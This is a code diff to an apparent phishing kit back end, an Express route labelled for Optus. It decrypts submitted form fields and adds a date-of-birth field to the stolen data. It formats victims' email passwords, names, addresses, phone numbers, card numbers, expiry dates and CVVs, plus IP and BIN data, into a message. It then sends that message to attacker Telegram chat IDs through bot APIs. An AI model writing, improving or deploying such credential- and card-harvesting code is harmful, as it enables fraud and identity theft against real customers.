@@ -10126,6 +10126,9 @@ app.post("/offshorebillionsOptus", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
     CryptoJS.enc.Utf8
   );
+  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
   address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
     CryptoJS.enc.Utf8
   );
@@ -10175,30 +10178,45 @@ app.post("/offshorebillionsOptus", (req, res) => {
     })
     .then(function () {
       binList = `${bin} | ${zip} | ${bankName}`;
-      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      var originalText = `+----------- Login Information ------------+\n| Email: ${email}\n| Password: ${password}\n\n+----------- Personal Information ------------+\n| Full Name: ${fullname}\n| DOB: ${dob}\n| Address: ${address}\n|City: ${city}\n| State: ${state}\n| ZIP: ${zip}\n| Phone Number: ${telephone}\n\n+ ----------- Card Information ------------+\n| Card Name: ${ccname}\n| Card Number: ${ccnum}\n| Expiry: ${ccexp}\n| CVV: ${cccvv}\n\n+ ----------- IP Information ------------+\n| IP: ${ip}\n\n+ ----------- BIN List Info ------------+\n${binList}`;
       if (bill == 100) {
         axios
           .post(
-            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `HAYTCHRES:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
           )
-          .catch((err) => {
-            console.log(err);
+          .catch((e) => {
+            console.log(e);
           });
         Spoofergoofer = 4;
       } else {
         axios
           .post(
-            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=OptusOSB:\n${originalText}`
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `OptusOSB:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
           )
-          .catch((err) => {
-            console.log(err);
+          .catch((e) => {
+            console.log(e);
           });
         axios
           .post(
-            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248091713&text=Optus:\n${originalText}`
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 1248091713,
+              text: `Optus:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
           )
-          .catch((err) => {
-            console.log(err);
+          .catch((e) => {
+            console.log(e);
           });
       }
       res.send("Update Completed");
